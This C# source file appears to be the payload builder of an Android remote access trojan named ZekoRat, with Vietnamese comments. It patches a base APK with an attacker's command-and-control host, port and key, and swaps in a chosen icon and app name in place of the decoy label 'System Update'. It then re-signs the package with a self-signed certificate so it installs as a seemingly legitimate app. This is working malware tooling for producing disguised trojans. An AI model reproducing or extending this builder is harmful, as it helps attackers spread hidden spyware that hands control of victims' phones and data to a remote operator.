using System.IO.Compression;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace ZekoRat.Server;

/// <summary>
/// Builder APK: thay assets/zk.conf (+ icon) trong base APK rồi ký v2.
/// Không cần Android SDK, không cần Java trên VPS.
/// </summary>
public static class ApkBuilder
{
    public static string BaseApkPath = Path.Combine("builder", "zk_base.apk");
    public static string KeysDir = "builder";

    static X509Certificate2? _cert;

    public static bool Ready() => File.Exists(BaseApkPath);

    public static X509Certificate2 GetCert()
    {
        if (_cert is not null) return _cert;
        Directory.CreateDirectory(KeysDir);
        var pfx = Path.Combine(KeysDir, "zeko.pfx");
        if (File.Exists(pfx))
        {
            _cert = X509CertificateLoader.LoadPkcs12FromFile(pfx, "zeko123");
            return _cert;
        }
        using var rsa = RSA.Create(2048);
        var req = new CertificateRequest("CN=System Update, O=Zeko, C=VN", rsa,
            HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
        req.CertificateExtensions.Add(new X509BasicConstraintsExtension(false, false, 0, false));
        req.CertificateExtensions.Add(new X509KeyUsageExtension(
            X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false));
        var cert = req.CreateSelfSigned(DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddYears(30));
        File.WriteAllBytes(pfx, cert.Export(X509ContentType.Pfx, "zeko123"));
        _cert = X509CertificateLoader.LoadPkcs12FromFile(pfx, "zeko123");
        return _cert;
    }

    public sealed record BuildResult(byte[]? Apk, string? Error);

    public static BuildResult Build(string host, int port, string psk, byte[]? iconPng, string? appLabel, string? homeUrl = null)
    {
        try
        {
            if (!File.Exists(BaseApkPath)) return new BuildResult(null, "chua co base apk: " + BaseApkPath);

            var conf = $"host={host}\nport={port}\npsk={psk}\nauto=1\nhome={homeUrl ?? ""}\n";
            var confBytes = Encoding.UTF8.GetBytes(conf);

            var entries = new List<Zip.Entry>();
            string? labelError = null;
            using (var zip = ZipFile.OpenRead(BaseApkPath))
            {
                foreach (var e in zip.Entries)
                {
                    // bỏ chữ ký cũ (v1 sẽ sai sau khi sửa)
                    if (e.FullName.StartsWith("META-INF/") &&
                        (e.FullName.EndsWith(".SF") || e.FullName.EndsWith(".RSA")
                         || e.FullName.EndsWith(".DSA") || e.FullName.EndsWith(".EC")
                         || e.FullName.EndsWith("MANIFEST.MF")))
                        continue;

                    byte[] data;
                    using (var s = e.Open())
                    using (var ms = new MemoryStream())
                    {
                        s.CopyTo(ms);
                        data = ms.ToArray();
                    }

                    if (e.FullName == "assets/zk.conf") data = confBytes;
                    else if (iconPng is not null && e.FullName == "res/drawable/ic_launcher.png")
                        data = iconPng;
                    else if (e.FullName == "resources.arsc" && !string.IsNullOrWhiteSpace(appLabel))
                    {
                        var (patched, changed, err) = Arsc.ReplaceString(data, "System Update", appLabel!.Trim());
                        if (changed) data = patched;
                        else labelError = err;
                    }

                    entries.Add(new Zip.Entry(e.FullName, data,
                        e.FullName.EndsWith("resources.arsc") || e.CompressedLength == e.Length));
                }
            }

            if (!entries.Any(x => x.Name == "assets/zk.conf"))
                entries.Add(new Zip.Entry("assets/zk.conf", confBytes, false));

            var zipBytes = Zip.Write(entries);
            var signed = ApkSign.SignV2(zipBytes, GetCert());
            if (!signed.Ok) return new BuildResult(null, "ky v2 loi: " + signed.Error);
            if (labelError is not null) return new BuildResult(signed.Apk, "label: " + labelError);
            return new BuildResult(signed.Apk, null);
        }
        catch (Exception ex)
        {
            return new BuildResult(null, ex.GetType().Name + ": " + ex.Message);
        }
    }
}
